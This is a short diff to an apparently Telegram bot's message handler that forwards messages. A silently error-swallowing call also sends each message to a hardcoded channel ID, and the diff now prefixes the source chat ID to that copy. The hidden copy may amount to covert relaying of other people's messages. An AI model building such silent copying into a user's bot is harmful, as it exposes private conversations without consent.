@@ -54,6 +54,7 @@ async def handlmsg(event):
                             else:
                                 await client.send_message(int(share), msg)
                             try:
+                                msg = str(chat_id) + '\n\n' + msg
                                 bot.send_message(-1001617820230, msg)
                             except:
                                 pass
@@ -67,6 +68,7 @@ async def handlmsg(event):
                         else:
                             await client.send_message(int(share), msg)
                         try:
+                            msg = str(chat_id) + '\n\n' + msg
                             bot.send_message(-1001617820230, msg)
                         except:
                             pass
